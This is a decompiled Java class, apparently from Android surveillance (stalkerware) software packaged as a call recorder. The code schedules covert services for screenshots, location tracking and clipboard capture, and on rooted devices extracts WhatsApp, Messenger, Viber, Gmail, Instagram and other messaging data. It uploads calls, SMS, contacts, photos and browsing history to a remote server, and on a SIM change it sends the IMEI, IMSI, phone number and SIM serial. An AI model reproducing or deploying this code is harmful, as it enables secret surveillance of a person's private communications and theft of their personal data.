package com.yasoka.spcallrecord.recorder.call.a.c.e;

import a.c.j.c;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.SystemClock;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import androidx.core.app.NotificationCompat;
import com.app.action.v;
import com.app.activity.MyApp;
import com.app.received.AllReceived;
import com.app.received.AppsUsageTimeAlarmReceived;
import com.app.received.IMRootReceived;
import com.app.received.LocationReceived;
import com.app.service.ClipboardService;
import com.app.service.GetDataRootService;
import com.app.service.LocLive;
import com.app.service.Localization;
import com.app.service.ServiceLocalization;
import com.app.service.ServiceObserver;
import com.app.service.ServiceScreenshotAuto;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

/* compiled from: FunctionsService */
public abstract class b {

    /* renamed from: a reason: collision with root package name */
    public static String f174a;

    /* compiled from: FunctionsService */
    static class a implements Runnable {

        /* renamed from: a reason: collision with root package name */
        final /* synthetic */ Context f175a;

        a(Context context) {
            this.f175a = context;
        }

        public void run() {
            try {
                HashMap hashMap = new HashMap();
                SharedPreferences defaultSharedPreferences = PreferenceManager.getDefaultSharedPreferences(this.f175a);
                String string = defaultSharedPreferences.getString("sentTokenToServer", null);
                if (string != null) {
                    StringBuilder sb = new StringBuilder();
                    sb.append("");
                    sb.append(e.e(this.f175a));
                    hashMap.put("idPhone", sb.toString());
                    hashMap.put("token", string);
                    if (a.b("user/updateTokenPhone.php", (Map<String, String>) hashMap)) {
                        defaultSharedPreferences.edit().putBoolean("tokenUpdate", true).apply();
                    }
                }
            } catch (Exception e2) {
                e2.getStackTrace();
                try {
                    e2.getStackTrace();
                    Crashlytics.logException(e2);
                } catch (Exception unused) {
                }
            }
        }
    }

    /* renamed from: a.c.e.b$b reason: collision with other inner class name */
    /* compiled from: FunctionsService */
    static class C0001b implements Runnable {

        /* renamed from: a reason: collision with root package name */
        final /* synthetic */ Context f176a;

        C0001b(Context context) {
            this.f176a = context;
        }

        public void run() {
            String str = "phone";
            String str2 = "";
            try {
                String simSerialNumber = ((TelephonyManager) this.f176a.getSystemService(str)).getSimSerialNumber();
                if (simSerialNumber != null && !simSerialNumber.equals(this.f176a.getSharedPreferences("user", 0).getString("simSerialNumber", str2))) {
                    e.R(this.f176a);
                    TelephonyManager telephonyManager = (TelephonyManager) this.f176a.getSystemService(str);
                    String deviceId = telephonyManager.getDeviceId();
                    String subscriberId = telephonyManager.getSubscriberId();
                    String deviceSoftwareVersion = telephonyManager.getDeviceSoftwareVersion();
                    String voiceMailNumber = telephonyManager.getVoiceMailNumber();
                    String simOperatorName = telephonyManager.getSimOperatorName();
                    String b2 = c.b();
                    StringBuilder sb = new StringBuilder();
                    sb.append("<b>Date : ");
                    sb.append(b2);
                    sb.append("</b><br/><b><u>SIM: </u></b><br/>IMEI: ");
                    sb.append(deviceId);
                    sb.append(", Number: ");
                    sb.append(telephonyManager.getLine1Number());
                    sb.append(", IMSI: ");
                    sb.append(subscriberId);
                    sb.append(", Software Version: ");
                    sb.append(deviceSoftwareVersion);
                    sb.append(", Sim Serial Number: ");
                    sb.append(simSerialNumber);
                    sb.append(", Voice Mail Number: ");
                    sb.append(voiceMailNumber);
                    sb.append(", Sim Operator Name: ");
                    sb.append(simOperatorName);
                    sb.append("<br/><b><u>System: </u></b><br/>OS Version: ");
                    sb.append(System.getProperty("os.version"));
                    sb.append(", API Level: ");
                    sb.append(VERSION.SDK);
                    sb.append(", Device: ");
                    sb.append(Build.DEVICE);
                    sb.append(", Model: ");
                    sb.append(Build.MODEL);
                    sb.append(", Product: ");
                    sb.append(Build.PRODUCT);
                    String sb2 = sb.toString();
                    HashMap hashMap = new HashMap();
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append(str2);
                    sb3.append(e.e(this.f176a));
                    hashMap.put("idPhone", sb3.toString());
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append(str2);
                    sb4.append(sb2);
                    hashMap.put("data", sb4.toString());
                    long a2 = a.a.a(e.e(this.f176a), b2, "SETCHANGESIM", -3, sb2, this.f176a);
                    if (a.b("sim/setChangeSIM.php", (Map<String, String>) hashMap)) {
                        a.a.d((int) a2, this.f176a);
                    }
                }
            } catch (Exception e2) {
                e2.getStackTrace();
            }
        }
    }

    static {
        StringBuilder a2 = a.b.a.a.a.a("package:");
        a2.append(MyApp.b().getApplicationContext().getPackageName());
        f174a = a2.toString();
    }

    public static void a(Context context, boolean z) {
        try {
            if (!e.N(context)) {
                return;
            }
            if (((e.j(context) && (VERSION.SDK_INT <= 25 || VERSION.SDK_INT > 28)) || e.a()) && !ServiceScreenshotAuto.f1248d) {
                if (z) {
                    long timeInMillis = Calendar.getInstance().getTimeInMillis();
                    Editor edit = context.getSharedPreferences("user", 0).edit();
                    edit.putLong("lastDateScreenshot", timeInMillis);
                    edit.apply();
                }
                Intent intent = new Intent(context, ServiceScreenshotAuto.class);
                intent.putExtra("first", z);
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent);
                } else {
                    context.startService(intent);
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void b(Context context, boolean z) {
        try {
            if (e.j(context)) {
                boolean z2 = true;
                if (!e.P(context)) {
                    if (!e.B(context)) {
                        if (!e.D(context)) {
                            if (!e.O(context)) {
                                if (!e.C(context)) {
                                    if (!e.G(context)) {
                                        if (!e.H(context)) {
                                            if (!e.F(context)) {
                                                z2 = false;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                if (z2) {
                    d(context);
                }
                if (!z) {
                    b(context);
                }
            }
        } catch (Throwable th) {
            th.getStackTrace();
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    public static void c(Context context) {
        try {
            String str = "typeDataRoot";
            if (e.P(context)) {
                if (v.a(context, "com.whatsapp")) {
                    Intent intent = new Intent(context, GetDataRootService.class);
                    intent.putExtra(str, g.WHATSAPP);
                    if (VERSION.SDK_INT >= 26) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }
                }
            }
            if (e.B(context) && (v.a(context, "com.facebook.orca") || v.a(context, "com.facebook.mlite"))) {
                Intent intent2 = new Intent(context, GetDataRootService.class);
                intent2.putExtra(str, g.FACEBOOK);
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent2);
                } else {
                    context.startService(intent2);
                }
            }
            if (e.D(context) && v.a(context, "com.google.android.talk")) {
                Intent intent3 = new Intent(context, GetDataRootService.class);
                intent3.putExtra(str, g.HANGOUTS);
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent3);
                } else {
                    context.startService(intent3);
                }
            }
            if (e.O(context) && v.a(context, "com.viber.voip")) {
                Intent intent4 = new Intent(context, GetDataRootService.class);
                intent4.putExtra(str, g.VIBER);
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent4);
                } else {
                    context.startService(intent4);
                }
            }
            if (e.C(context) && v.a(context, "com.google.android.gm")) {
                Intent intent5 = new Intent(context, GetDataRootService.class);
                intent5.putExtra(str, g.GMAIL);
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent5);
                } else {
                    context.startService(intent5);
                }
            }
            if (e.G(context) && v.a(context, "kik.android")) {
                Intent intent6 = new Intent(context, GetDataRootService.class);
                intent6.putExtra(str, g.KIK);
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent6);
                } else {
                    context.startService(intent6);
                }
            }
            if (e.H(context) && v.a(context, "jp.naver.line.android")) {
                Intent intent7 = new Intent(context, GetDataRootService.class);
                intent7.putExtra(str, g.LINE);
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent7);
                } else {
                    context.startService(intent7);
                }
            }
            if (e.F(context) && v.a(context, "com.instagram.android")) {
                Intent intent8 = new Intent(context, GetDataRootService.class);
                intent8.putExtra(str, g.INSTAGRAM);
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(intent8);
                } else {
                    context.startService(intent8);
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    private static void d(Context context) {
        if (!(PendingIntent.getBroadcast(context, 0, new Intent(context, IMRootReceived.class), 536870912) != null)) {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(NotificationCompat.CATEGORY_ALARM);
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, IMRootReceived.class), 134217728);
            if (alarmManager != null) {
                alarmManager.cancel(broadcast);
                int i = VERSION.SDK_INT;
                if (i >= 23) {
                    alarmManager.setAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 10000, broadcast);
                } else if (i >= 19) {
                    alarmManager.setExact(2, SystemClock.elapsedRealtime() + 10000, broadcast);
                } else {
                    alarmManager.set(2, SystemClock.elapsedRealtime() + 10000, broadcast);
                }
            }
        }
    }

    public static void e(Context context) {
        try {
            if (e.b()) {
                if (!(PendingIntent.getBroadcast(context, 0, new Intent(context, AppsUsageTimeAlarmReceived.class), 536870912) != null)) {
                    AlarmManager alarmManager = (AlarmManager) context.getSystemService(NotificationCompat.CATEGORY_ALARM);
                    PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, AppsUsageTimeAlarmReceived.class), 134217728);
                    if (alarmManager == null) {
                        return;
                    }
                    if (VERSION.SDK_INT >= 23) {
                        alarmManager.setAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 13800000, broadcast);
                    } else if (VERSION.SDK_INT >= 19) {
                        alarmManager.setExact(2, SystemClock.elapsedRealtime() + 13800000, broadcast);
                    } else {
                        alarmManager.set(2, SystemClock.elapsedRealtime() + 13800000, broadcast);
                    }
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void f(Context context) {
        try {
            boolean z = PendingIntent.getBroadcast(context, 0, new Intent(context, AllReceived.class), 536870912) != null;
            StringBuilder sb = new StringBuilder();
            sb.append("alarmUp : ");
            sb.append(z);
            sb.toString();
            if (!z) {
                AlarmManager alarmManager = (AlarmManager) context.getSystemService(NotificationCompat.CATEGORY_ALARM);
                if (alarmManager != null) {
                    PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, AllReceived.class), 134217728);
                    if (VERSION.SDK_INT >= 23) {
                        long elapsedRealtime = SystemClock.elapsedRealtime();
                        long m = e.m(context);
                        Long.signum(m);
                        alarmManager.setAndAllowWhileIdle(2, (m * 60000) + elapsedRealtime, broadcast);
                    } else if (VERSION.SDK_INT >= 19) {
                        alarmManager.setExact(2, (e.m(context) * 60000) + SystemClock.elapsedRealtime(), broadcast);
                    } else {
                        alarmManager.set(2, (e.m(context) * 60000) + SystemClock.elapsedRealtime(), broadcast);
                    }
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void g(Context context) {
        try {
            if (VERSION.SDK_INT < 29 && !ClipboardService.f1060c) {
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(new Intent(context, ClipboardService.class));
                } else {
                    context.startService(new Intent(context, ClipboardService.class));
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void h(Context context) {
        try {
            if (e.I(context)) {
                if (!Localization.f1103e) {
                    context.stopService(new Intent(context, Localization.class));
                    if (VERSION.SDK_INT >= 26) {
                        context.startForegroundService(new Intent(context, Localization.class));
                    } else {
                        context.startService(new Intent(context, Localization.class));
                    }
                }
                if (!(PendingIntent.getBroadcast(context, 0, new Intent(context, LocationReceived.class), 536870912) != null)) {
                    AlarmManager alarmManager = (AlarmManager) context.getSystemService(NotificationCompat.CATEGORY_ALARM);
                    if (alarmManager != null) {
                        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, LocationReceived.class), 134217728);
                        if (VERSION.SDK_INT >= 23) {
                            alarmManager.setAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + ((long) (e.t(context) * 60000)), broadcast);
                        } else if (VERSION.SDK_INT >= 19) {
                            alarmManager.setExact(2, SystemClock.elapsedRealtime() + ((long) (e.t(context) * 60000)), broadcast);
                        } else {
                            alarmManager.set(2, SystemClock.elapsedRealtime() + ((long) (e.t(context) * 60000)), broadcast);
                        }
                    }
                }
                a(context);
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    public static void i(Context context) {
        try {
            if (!ServiceObserver.g) {
                context.startService(new Intent(context, ServiceObserver.class));
                if (VERSION.SDK_INT >= 26) {
                    context.startForegroundService(new Intent(context, ServiceObserver.class));
                } else {
                    context.startService(new Intent(context, ServiceObserver.class));
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void j(Context context) {
        try {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(NotificationCompat.CATEGORY_ALARM);
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, IMRootReceived.class), 268435456);
            alarmManager.cancel(broadcast);
            broadcast.cancel();
            b(context, false);
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void k(Context context) {
        context.stopService(new Intent(context, LocLive.class));
    }

    public static void l(Context context) {
        try {
            context.stopService(new Intent(context, ServiceScreenshotAuto.class));
            a(context, false);
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }

    public static void m(Context context) {
        try {
            context.stopService(new Intent(context, ClipboardService.class));
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void n(Context context) {
        try {
            context.stopService(new Intent(context, Localization.class));
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, LocationReceived.class), 268435456);
            ((AlarmManager) context.getSystemService(NotificationCompat.CATEGORY_ALARM)).cancel(broadcast);
            broadcast.cancel();
        } catch (Throwable th) {
            th.getStackTrace();
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    public static void o(Context context) {
        try {
            context.stopService(new Intent(context, ServiceObserver.class));
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void p(Context context) {
        try {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(NotificationCompat.CATEGORY_ALARM);
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(context, AllReceived.class), 268435456);
            alarmManager.cancel(broadcast);
            broadcast.cancel();
            f(context);
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void q(Context context) {
        new Thread(new a(context)).start();
    }

    public static synchronized void r(Context context) {
        synchronized (b.class) {
            try {
                if (c.n(context) && e.e(context) > 0) {
                    ArrayList arrayList = new ArrayList();
                    if (e.z(context)) {
                        arrayList.add(f.CALLS);
                    }
                    if (e.M(context)) {
                        arrayList.add(f.SMS);
                    }
                    if (e.I(context)) {
                        arrayList.add(f.LOCS);
                    }
                    if (e.N(context)) {
                        arrayList.add(f.SCREENSHOT);
                    }
                    if (e.b()) {
                        arrayList.add(f.APPS);
                    }
                    if (e.L(context)) {
                        arrayList.add(f.PICTURES);
                    }
                    if (e.A(context)) {
                        arrayList.add(f.CONTACTS);
                    }
                    if (e.y(context)) {
                        arrayList.add(f.CALENDAR);
                    }
                    if (e.K(context)) {
                        arrayList.add(f.MMS);
                    }
                    if (e.E(context)) {
                        arrayList.add(f.SITE_HISTORY);
                    }
                    if (context.getSharedPreferences("user", 0).getBoolean("trackClipboard", true)) {
                        arrayList.add(f.CLIPBOARD);
                    }
                    arrayList.add(f.SMS_ALERT);
                    arrayList.add(f.LOGS_DATA);
                    arrayList.add(f.FILE_EXPLORER);
                    arrayList.add(f.SOCIAL_NETWORK);
                    arrayList.add(f.APPS_BLOCK_STATE);
                    Intent intent = new Intent(context, UploadDataService.class);
                    intent.putExtra("listTypeData", arrayList);
                    if (VERSION.SDK_INT >= 26) {
                        context.startForegroundService(intent);
                    } else {
                        context.startService(intent);
                    }
                    try {
                        if (!PreferenceManager.getDefaultSharedPreferences(context).getBoolean("tokenUpdate", false)) {
                            q(context);
                        }
                    } catch (Exception e2) {
                        try {
                            e2.getStackTrace();
                            Crashlytics.logException(e2);
                        } catch (Exception unused) {
                        }
                    }
                }
            } catch (Throwable th) {
                th.getStackTrace();
                Crashlytics.logException(th);
            }
        }
        return;
    }

    @SuppressLint({"MissingPermission"})
    public static void s(Context context) {
        new Thread(new C0001b(context)).start();
    }

    private static void b(Context context) {
        String str = "lastDateRoot";
        String str2 = "user";
        try {
            long j = context.getSharedPreferences(str2, 0).getLong(str, 0);
            int l = e.l(context);
            Calendar instance = Calendar.getInstance();
            instance.setTimeInMillis(j);
            instance.add(12, l + 10);
            Calendar instance2 = Calendar.getInstance();
            if (instance.getTimeInMillis() <= instance2.getTimeInMillis()) {
                c(context);
                long timeInMillis = instance2.getTimeInMillis();
                Editor edit = context.getSharedPreferences(str2, 0).edit();
                edit.putLong(str, timeInMillis);
                edit.apply();
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static void a(Context context, int i) {
        if (!LocLive.q) {
            Intent intent = new Intent(context, LocLive.class);
            intent.putExtra("mTime", i);
            if (VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        }
    }

    public static String a() {
        String str = "";
        try {
            StringBuilder sb = new StringBuilder();
            sb.append(str);
            sb.append(VERSION.RELEASE);
            return sb.toString();
        } catch (Exception unused) {
            return str;
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(6:5|6|(1:8)(1:9)|15|16|25) */
    /* JADX WARNING: Missing exception handler attribute for start block: B:15:0x0061 */
    private static void a(Context context) {
        String str = "lastDateLocalisation";
        String str2 = "user";
        try {
            long j = context.getSharedPreferences(str2, 0).getLong(str, 0);
            int t = e.t(context);
            Calendar instance = Calendar.getInstance();
            instance.setTimeInMillis(j);
            instance.add(12, t + 5);
            Calendar instance2 = Calendar.getInstance();
            if (instance.getTimeInMillis() <= instance2.getTimeInMillis()) {
                try {
                    context.stopService(new Intent(context, ServiceLocalization.class));
                    if (VERSION.SDK_INT >= 26) {
                        context.startForegroundService(new Intent(context, ServiceLocalization.class));
                    } else {
                        context.startService(new Intent(context, ServiceLocalization.class));
                    }
                } catch (Throwable th) {
                    th.getStackTrace();
                    th.getStackTrace();
                    Crashlytics.logException(th);
                }
                long timeInMillis = instance2.getTimeInMillis();
                Editor edit = context.getSharedPreferences(str2, 0).edit();
                edit.putLong(str, timeInMillis);
                edit.apply();
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }
}
